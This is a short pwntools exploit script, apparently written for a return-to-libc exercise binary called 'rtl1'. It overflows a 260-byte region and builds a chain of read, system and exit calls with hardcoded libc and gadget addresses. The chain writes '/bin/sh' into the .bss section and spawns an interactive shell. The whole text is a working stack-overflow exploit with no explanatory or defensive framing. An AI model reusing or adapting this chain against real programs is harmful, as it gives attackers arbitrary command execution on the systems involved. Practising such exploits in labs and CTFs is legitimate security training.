from pwn import *

p = process("./rtl1")

fsystem = 0xf7e0f620
fread = 0xf7ebb310
fexit = 0xf7e02390
bss = 0x804c020
gadget = 0x8049209
pppr = 0x8049209
pr = 0x804920a


payload = "A"*(256+4)
payload += p32(fread)
payload += p32(pppr)
payload += p32(0x0)
payload += p32(bss)
payload += p32(0x8)

payload += p32(fsystem)
payload += p32(pr)
payload += p32(bss)

payload += p32(fexit)
payload += "A"*4
payload += p32(0x0)

p.send(payload)
sleep(0.5)
p.send("/bin/sh\x00")

# raw_input("Timing")
p.interactive()

